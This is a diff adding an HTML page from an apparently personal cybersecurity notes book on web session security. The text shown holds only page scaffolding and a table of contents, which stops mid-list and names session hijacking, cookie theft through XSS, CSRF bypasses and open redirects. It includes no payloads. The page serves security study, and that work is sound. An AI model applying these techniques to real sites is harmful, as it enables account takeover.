@@ -1,0 +1,1234 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Session Security - Cybersecurity Notes</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../../theme/pagetoc.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Cybersecurity Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="https://github.com/d41y/d41y.github.io" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <style>
+.mdbook-callouts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-radius: 4px;
+  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
+  background: var(--mdbook-callouts-background);
+}
+
+.mdbook-callouts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-callouts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-callouts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-callouts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-callouts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-callouts-icon);
+  mask-image: var(--mdbook-callouts-icon);
+}
+
+/* icons at: https://lucide.dev/icons/ */
+
+.mdbook-callouts-info {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/info */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-note {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/pencil */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-tip,
+.mdbook-callouts-hint {
+  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
+  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
+  /* https://lucide.dev/icons/flame */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-important {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-success,
+.mdbook-callouts-check,
+.mdbook-callouts-done {
+  --mdbook-callouts-color: rgb(var(--color-green-rgb));
+  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
+  /* https://lucide.dev/icons/check */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-question,
+.mdbook-callouts-help,
+.mdbook-callouts-faq {
+  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
+  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
+  /* https://lucide.dev/icons/help-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-warning,
+.mdbook-callouts-warn {
+  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
+  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-triangle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-caution {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/shield-alert */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-failure,
+.mdbook-callouts-fail,
+.mdbook-callouts-missing {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/x */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-error,
+.mdbook-callouts-danger {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/zap */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-bug {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/bug */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-examples,
+.mdbook-callouts-example {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/list */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-quote {
+  --mdbook-callouts-color: rgb(158, 158, 158);
+  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
+  /* https://lucide.dev/icons/quote */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
+}
+
+
+.ayu {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.light {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+
+.coal {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.navy {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.rust {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+</style>
+<ul>
+<li><a href="#session-security">Session Security</a>
+<ul>
+<li><a href="#intro">Intro</a>
+<ul>
+<li><a href="#session-identifier-security">Session Identifier Security</a></li>
+<li><a href="#session-attacks">Session Attacks</a></li>
+</ul>
+</li>
+<li><a href="#session-attacks-1">Session Attacks</a>
+<ul>
+<li><a href="#session-hijacking">Session Hijacking</a>
+<ul>
+<li><a href="#example">Example</a>
+<ul>
+<li><a href="#part-1-identify-the-session-identifier">Part 1: Identify the session identifier</a></li>
+<li><a href="#part-2-simulate-an-attacker">Part 2: Simulate an attacker</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#session-fixation">Session Fixation</a>
+<ul>
+<li><a href="#example-1">Example</a></li>
+<li><a href="#example-of-vulnerable-code">Example of vulnerable code</a></li>
+</ul>
+</li>
+<li><a href="#obtaining-session-identifiers-without-user-interaction">Obtaining Session Identifiers without User Interaction</a>
+<ul>
+<li><a href="#obtaining-session-identifiers-via-traffic-sniffing">Obtaining Session Identifiers via Traffic Sniffing</a></li>
+<li><a href="#obtaining-session-identifiers-post-exploitation">Obtaining Session Identifiers Post-Exploitation</a>
+<ul>
+<li><a href="#php">PHP</a></li>
+<li><a href="#java">Java</a></li>
+<li><a href="#net">.NET</a></li>
+</ul>
+</li>
+<li><a href="#obtaining-session-identifiers-post-exploitation---database-access">Obtaining Session Identifiers Post-Exploitation - Database Access</a></li>
+</ul>
+</li>
+<li><a href="#xss">XSS</a>
+<ul>
+<li><a href="#example-2">Example</a>
+<ul>
+<li><a href="#obtaining-session-cookie-through-xss">Obtaining session cookie through XSS</a></li>
+<li><a href="#obtaining-session-cookies-through-xss-netcat-edition">Obtaining session cookies through XSS (Netcat edition)</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#csrf">CSRF</a>
+<ul>
+<li><a href="#example-3">Example</a></li>
+</ul>
+</li>
+<li><a href="#csrf---get-based">CSRF - GET-based</a>
+<ul>
+<li><a href="#example-4">Example</a></li>
+</ul>
+</li>
+<li><a href="#csrf---post-based">CSRF - POST-based</a>
+<ul>
+<li><a href="#example-5">Example</a></li>
+</ul>
+</li>
+<li><a href="#xss--csrf-chaining">XSS &amp; CSRF Chaining</a>
+<ul>
+<li><a href="#example-6">Example</a></li>
+</ul>
+</li>
+<li><a href="#exploiting-weak-csrf-tokens">Exploiting Weak CSRF Tokens</a>
+<ul>
+<li><a href="#example-7">Example</a></li>
+</ul>
+</li>
+<li><a href="#additional-csrf-protection-bypasses">Additional CSRF Protection Bypasses</a>
+<ul>
+<li><a href="#null-value">Null Value</a></li>
+<li><a href="#random-csrf-token">Random CSRF Token</a></li>
+<li><a href="#use-another-sessions-csrf-token">Use Another Session's CSRF Token</a></li>
+<li><a href="#request-method-tampering">Request Method Tampering</a></li>
+<li><a href="#delete-the-csrf-token-parameter-or-send-a-blank-token">Delete the CSRF Token Parameter or send a blank Token</a></li>
+<li><a href="#session-fixation--csrf">Session Fixation &gt; CSRF</a></li>
+<li><a href="#anti-csrf-protection-via-the-referrer-header">Anti-CSRF Protection via the Referrer Header</a></li>
+<li><a href="#bypass-the-regex">Bypass the RegEx</a></li>
+</ul>
+</li>
+<li><a href="#open-redirect">Open Redirect</a>
+<ul>
+<li><a href="#example-8">Example</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#remediation-advice">Remediation Advice</a>
+<ul>
+<li><a href="#session-hijacking-1">Session Hijacking</a></li>
+<li><a href="#session-fixation-1">Session Fixation</a>
+<ul>
